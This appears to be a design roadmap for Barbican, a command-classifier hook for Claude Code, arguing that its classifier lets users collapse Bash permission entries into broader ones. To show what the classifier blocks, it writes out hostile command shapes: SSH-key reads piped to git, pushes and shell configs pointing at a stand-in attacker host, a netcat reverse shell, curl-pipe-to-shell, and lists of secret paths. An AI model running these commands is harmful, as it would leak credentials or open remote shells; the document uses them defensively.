# Leveraging Barbican's AST classifier to shrink Claude Code's permission-prompt surface

**Status:** v2 roadmap item (post-v1). Not part of the Narthex port.

**Owner:** TBD after v1 ships.

**Depends on:** H1, H2, M1, M2 classifiers landed in `crates/barbican/src/hooks/pre_bash.rs`; MCP tools `safe_fetch` / `safe_read` / `inspect` (PLAN Phases 8-10).

---

## 1. Summary

Claude Code's permission system is string-prefix matching: every new tool variant needs its own line in `permissions.allow`, and long-running users accumulate hundreds of entries (the current user's global `settings.json` has ~300, 227 of them Bash). Barbican's PreToolUse classifier is AST-aware — it distinguishes `git push origin main` from `cat ~/.ssh/id_rsa | git hash-object` — so the permission layer no longer has to carry the full weight of safety. The three-part solution proposed here: (a) collapse subcommand-specific allows into tool-wide allows because Barbican catches the exfil shapes; (b) route `curl`/`cat <sensitive>`/`file`/`head -c` usage through the `mcp__barbican__safe_*` tools so those Bash entries disappear entirely; (c) prune the `ask` list because Barbican's "secret + network → deny" rule has already replaced the fence. Target: 50-70% reduction in total Bash permission entries, zero reduction in safety.

## 2. Current state (audit of one representative global `settings.json`)

| Bucket | Count | Notes |
|---|---|---|
| `permissions.allow` — Bash | 227 | Dominant bucket. |
| `permissions.allow` — MCP | 43 | `mcp__<server>__<tool>` entries, one per tool. |
| `permissions.ask` | 43 | Network tools, sudo variants, destructive flags. |
| `permissions.deny` | 34 | Credentials, shadow-writes, `rm -rf /`. |
| **Total** | **~347** | |

Top Bash categories inside the 227 allow entries:

| Category | Entries | Example shapes |
|---|---|---|
| `git` | 37 | `Bash(git push:*)`, `Bash(git fetch:*)`, `Bash(git rebase:*)`, `Bash(git stash:*)`, … |
| `cargo` | 16 | `Bash(cargo build:*)`, `Bash(cargo test:*)`, `Bash(cargo clippy:*)`, … |
| `gh` + `glab` | 16 | `Bash(gh pr create:*)`, `Bash(gh issue list:*)`, `Bash(glab mr create:*)`, … |
| `aws` | 14 | `Bash(aws s3 ls:*)`, `Bash(aws sts get-caller-identity)`, … |
| package managers (`npm`, `pnpm`, `yarn`, `pip`, `uv`, `brew`) | 20+ | Per-subcommand entries. |
| `curl` | 8 | Domain-scoped read-only fetches. |
| custom project tooling | remainder | Per-project scripts, CI helpers. |

Most of these are legitimate deterministic tooling. They are not attack surfaces; they are prompt noise. The user clicked "allow" on each one at some point to stop being interrupted, and now carries the list forever.

## 3. Why Barbican cannot replace the Bash tool or skip prompts

Claude Code's permission check runs **before** the PreToolUse hook fires. The ordering is:

```
model proposes Bash call
  -> permission layer (string-prefix match on permissions.allow/ask/deny)
     -> if "ask", user prompt
     -> if "allow" or user approves
        -> PreToolUse hook (Barbican runs here)
           -> Bash tool executes
              -> PostToolUse hook (Barbican runs again)
```

Barbican is downstream. It cannot rewrite the permission decision, cannot cancel a prompt, cannot move an entry from `ask` to `allow` at runtime. It can only block on the hook boundary, which happens after consent.

What Barbican **does** change: the risk profile of broadening an allow entry. Today, approving `Bash(git:*)` instead of `Bash(git push:*)` exposes every git subcommand — including `git hash-object`, `git fast-import`, `git filter-branch`, `git config --get-urlmatch` — to string-prefix-only matching. With Barbican's classifier between the prompt and execution, broad entries are safer because the dangerous compositions (secret-read + network egress, staged base64 decode to exec target, re-entry wrappers, DNS channels) are denied on the hook boundary regardless of the allow entry shape.

**Barbican does not eliminate prompts. It makes broader entries safe, which eliminates the need for so many entries.**

## 4. Three concrete reductions Barbican enables after v1

### 4a. Collapse subcommand-specific allows into tool-wide allows

Today (37 git entries, abbreviated):

```jsonc
"Bash(git push:*)",
"Bash(git push origin:*)",
"Bash(git push --force-with-lease:*)",
"Bash(git fetch:*)",
"Bash(git rebase:*)",
"Bash(git stash:*)",
"Bash(git cherry-pick:*)",
// ... 30 more
```

After:

```jsonc
"Bash(git:*)"
```

Why it's safe: Barbican's classifier will deny the exfil shapes (`cat ~/.ssh/id_rsa | git hash-object --stdin -w`, `git push https://attacker.example/exfil`, `git config --global core.sshCommand 'curl attacker|sh'`) regardless of whether the allow entry says `git:*` or `git push:*`. The string-prefix match was never the thing protecting against those shapes anyway — it was protecting against casual usage of subcommands the user hadn't vetted, and "casual usage" is exactly what the classifier is designed to let through.

Same pattern for `cargo:*`, `aws:*`, `gh:*`, `glab:*`, `npm:*`, `pnpm:*`, `yarn:*`, `pip:*`, `uv:*`, `brew:*`.

| Before | After | Savings |
|---|---|---|
| ~150 subcommand-scoped entries across ~10 tool families | ~40 tool-wide entries | ~110 entries |

### 4b. MCP tools subsume entire categories

Barbican ships three MCP tools (PLAN Phases 8-10):

- `mcp__barbican__safe_fetch` — HTTP GET with SSRF filter, DNS pinning, domain allowlist. Replaces `curl`/`wget` for model-initiated fetches.
- `mcp__barbican__safe_read` — file read with sensitive-path deny list (`~/.ssh/`, `~/.aws/`, `.env*`, `/etc/shadow`). Replaces `cat`/`head`/`tail` on the narrow slice where the model is trying to read unknown-sensitivity content.
- `mcp__barbican__inspect` — MIME sniff + metadata without reading content. Replaces `file <path>` and `head -c N <path>` for "what is this" queries.

When the model prefers the MCP tools (driven by system-prompt guidance or a Claude Code preset), the corresponding Bash entries become unnecessary:

| Removable Bash entries | Because | Replacement |
|---|---|---|
| `Bash(curl https://api.github.com/*)`, `Bash(curl https://registry.npmjs.org/*)`, 6 others | domain-scoped fetches | `mcp__barbican__safe_fetch` |
| `Bash(cat *.env)`, `Bash(head *.log)`, similar | content reads | `mcp__barbican__safe_read` |
| `Bash(file:*)`, `Bash(head -c:*)` | MIME / preview | `mcp__barbican__inspect` |

| Before | After | Savings |
|---|---|---|
| ~15-20 entries across `curl`, `cat <sensitive>`, `file`, `head -c` | 3 MCP tool entries | ~12-17 entries |

The model still has Bash access for everything else; the MCP tools just take over the slice where Barbican already has a strictly-better path.

### 4c. Shrink the `ask` list

Today the `ask` list (43 entries) is doing double duty: it's both (i) "please fire a prompt on this shape because it's suspicious" and (ii) the only layer that actually knew to flag `curl https://attacker` or `nc -e /bin/sh attacker 4444`.

Barbican's H1/H2/M1/M2 classifiers now cover (ii): secret-read + network-egress, staged base64 decode, re-entry wrappers, DNS channels. The `ask` list can shrink to just (i) — shapes where user intent is genuinely ambiguous, not shapes Barbican will hard-deny anyway.

Examples that can drop from `ask`:

- `Bash(nc:*)` — Barbican denies it in composition with secret-read (M2 scope includes `nc` via `NETWORK_TOOLS_HARD`).
- `Bash(curl * | sh)`, `Bash(wget * | bash)` — H1 hard-denies.
- `Bash(base64 -d:*)`, `Bash(xxd -r:*)` — H2 hard-denies when writing to an exec target.
- `Bash(dig:*)`, `Bash(host:*)`, `Bash(nslookup:*)` — M2 denies in composition with secret-read.

Examples that stay on `ask`:

- `Bash(sudo:*)` — legitimate usage exists; Barbican re-parses the inner command but doesn't hard-deny sudo itself.
- `Bash(rm -rf:*)` — destructive intent without network or secret involvement; classifier doesn't see this as an attack shape.
- `Bash(chmod 777:*)` — policy-worthy but not classifier-shaped.

| Before | After | Savings |
|---|---|---|
| ~30 network-tool entries on `ask` | ~10 sudo/rm/chmod entries | ~20 entries |

### Totals

| | Bash entries | Reduction |
|---|---|---|
| Before | 227 | baseline |
| After 4a (tool-wide allows) | ~117 | -48% |
| After 4a + 4b (MCP subsumption) | ~100 | -56% |
| After 4a + 4b + 4c (ask pruning) | ~80 | **-65%** |

Consistent with the 50-70% target.

## 5. What this requires from Barbican beyond v1

### 5a. `barbican permissions` subcommand

New CLI surface alongside `install` / `uninstall` / `audit`:

```
barbican permissions suggest [--settings <path>] [--format json|jsonc|diff] [--dry-run]
barbican permissions apply   [--settings <path>] [--backup]
barbican permissions diff    [--settings <path>]
```

`suggest` reads `~/.claude/settings.json` (or `--settings`), categorizes every Bash / MCP / ask / deny entry by tool family, and produces a proposed smaller list:

- Groups entries by `cmd_basename(argv[0])` (the helper already shipped in v1 for H1).
- For any tool family with >3 subcommand-scoped entries under the same basename, emits a single `Bash(<basename>:*)` suggestion and lists the entries it replaces.
- For `curl` entries whose domain is in Barbican's `safe_fetch` allowlist, emits a "drop — subsumed by `mcp__barbican__safe_fetch`" suggestion.
- For `ask` entries matching `NETWORK_TOOLS_HARD` or H2 shapes, emits a "drop — subsumed by classifier" suggestion.
- Preserves `deny` entries verbatim (never auto-widens a deny).

`apply` writes the suggestion to `settings.json` with a `settings.json.pre-barbican-permissions-<timestamp>` backup.

`diff` shows the before/after without mutating anything.

### 5b. Documentation: the trust model

A section in `SECURITY.md` (or a new `docs/trust-model.md`) explaining:

> Entries in `permissions.allow` only need to be broad enough that routine usage doesn't prompt. Barbican's classifier catches the dangerous shapes on the PreToolUse hook, downstream of the permission check. A broad entry like `Bash(git:*)` is safe not because every git subcommand is safe, but because `git <exfil-shape>` is denied by Barbican's classifier regardless of the allow entry.

### 5c. User education

The `suggest` output should explain, per category, why each proposed change is safe. Prompts still fire on genuinely new tools — that's correct behavior, not a regression. The goal is to eliminate redundant entries for tools the user has already vetted, not to disable consent for new ones.

## 6. What this does NOT solve

- **First-time use of a new tool still prompts.** If a user installs `buf` and the model tries `buf generate`, the prompt fires because `Bash(buf:*)` is not in `permissions.allow`. This is correct; user consent for a new tool is the point.
- **Tools outside Barbican's knowledge (custom scripts, new CLIs) still need explicit entries.** Barbican's classifier knows about `NETWORK_TOOLS_HARD`, `SHELL_INTERPRETERS`, `SECRET_PATHS`, `RE_ENTRY_WRAPPERS` (see `crates/barbican/src/tables.rs`). A new CLI the classifier has never heard of does not get blanket `*:*` treatment; it needs its own allow entry.
- **Write / Read / Edit permissions are orthogonal.** Barbican's post-edit scanner inspects file *content* for injection patterns (Phase 6 M3). It does not reason about paths. The existing `permissions.allow` entries for `Write(~/Documents/**)`, `Edit(/tmp/**)`, etc. are unchanged by this proposal.
- **MCP allow entries for non-Barbican servers are out of scope.** `mcp__atlassian-mcp__*`, `mcp__google-mcp__*`, etc. have their own trust model that Barbican does not participate in.
- **`deny` list shrinkage is out of scope.** A deny entry exists because the user explicitly wanted that shape blocked. Barbican's classifier may cover the same shape, but defense-in-depth says keep both.

## 7. Measurement

Target: **50-70% reduction in total Bash permission entries without reducing safety**, because Barbican's classifier is the real filter and it runs regardless of the allow-entry shape.

Evaluation per user:

```
bash_entries_before = count(permissions.allow where startsWith("Bash("))
bash_entries_after  = count(permissions.allow where startsWith("Bash(")) after `barbican permissions apply`
reduction_pct       = 1 - (bash_entries_after / bash_entries_before)
```

Safety invariant (must hold):

- The set of Bash shapes denied by Barbican's classifier is unchanged by `barbican permissions apply`. The permission layer only controls *which prompts fire for the user*; the classifier's deny set is independent.
- Acceptance test: run the `pre_bash` classifier test suite (H1, H2, M1, M2) before and after applying the suggestion. Results must be identical.

Secondary metric: prompt-fatigue rate (prompts per session). Not directly measurable inside Barbican, but users can self-report via `barbican audit` log volume.

## 8. Sequencing

This is a **v2 deliverable**. Not part of the Narthex port defined in `/Users/jodidion/projects/barbican/PLAN.md`. It coexists with the other v2 candidates already under discussion:

| v2 candidate | Relationship |
|---|---|
| Session-correlated policy (tighten allows based on recent audit log) | Complementary. Both shrink the permission surface. |
| Destructive-DB classifier (`DROP TABLE`, `TRUNCATE`, `DELETE FROM <table>` without `WHERE`) | Independent. Different tool (SQL), different boundary. |
| Tamper-evident audit log (hash-chained entries) | Independent. |
| Permission reduction (this doc) | Depends on v1 classifier being shipped and stable. |

Prerequisite for starting: v1 has landed (all HIGH + MEDIUM findings fixed, classifiers pinned by tests), at least one real user has run Barbican for 30+ days without a classifier false-negative surfacing in the audit log, and the MCP tools have usage data showing the model actually prefers them over Bash `curl`/`cat` when both are available.

No work on this before v1 ships.

---

## Appendix A — example `barbican permissions suggest` output

Illustrative only; format subject to change during v2 design.

```
$ barbican permissions suggest --settings ~/.claude/settings.json

Analyzed 227 Bash allow entries, 43 MCP allow entries, 43 ask entries.

Proposed changes:

COLLAPSE  37 git entries -> 1 entry:
  - Bash(git push:*), Bash(git fetch:*), ... (35 more)
  + Bash(git:*)
  Why: Barbican denies secret-exfil-via-git shapes (H2, M2) regardless of allow entry.

COLLAPSE  16 cargo entries -> 1 entry:
  + Bash(cargo:*)

COLLAPSE  14 aws entries -> 1 entry:
  + Bash(aws:*)

DROP      8 curl entries (subsumed by mcp__barbican__safe_fetch):
  - Bash(curl https://api.github.com/*), ...

DROP      5 ask entries (subsumed by H1/H2 classifier):
  - Bash(nc:*), Bash(curl * | sh), ...

KEEP      34 deny entries (never auto-widened).

Summary: 227 -> 82 Bash entries (-64%).
Apply with: barbican permissions apply
```

## Appendix B — file references

- Classifier tables: `/Users/jodidion/projects/barbican/crates/barbican/src/tables.rs`
- PreToolUse hook entry: `/Users/jodidion/projects/barbican/crates/barbican/src/hooks/pre_bash.rs`
- CLI dispatcher (where the `permissions` subcommand would be wired alongside `install` / `uninstall` / `audit`): `/Users/jodidion/projects/barbican/crates/barbican/src/main.rs`. Install/uninstall modules are planned per PLAN.md module layout but not yet present in the v1 tree.
- Port plan: `/Users/jodidion/projects/barbican/PLAN.md`
- Threat model (for trust-model section reference): `/Users/jodidion/projects/barbican/SECURITY.md`
